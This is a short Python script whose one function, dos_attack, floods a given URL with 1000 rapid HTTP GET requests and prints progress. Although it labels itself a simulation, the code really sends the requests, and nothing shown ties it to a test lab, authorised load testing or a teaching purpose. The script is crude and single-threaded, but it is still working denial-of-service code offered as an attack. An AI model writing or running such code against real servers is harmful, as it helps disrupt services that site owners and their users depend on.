import time
import requests

def dos_attack(target_url):
    print("Simulating Denial-of-Service attack...")
    for _ in range(1000):  
        print("Sending request...")
        try:
            requests.get(target_url)
        except Exception as e:
            print(f"Request failed: {e}")
        time.sleep(0.01)  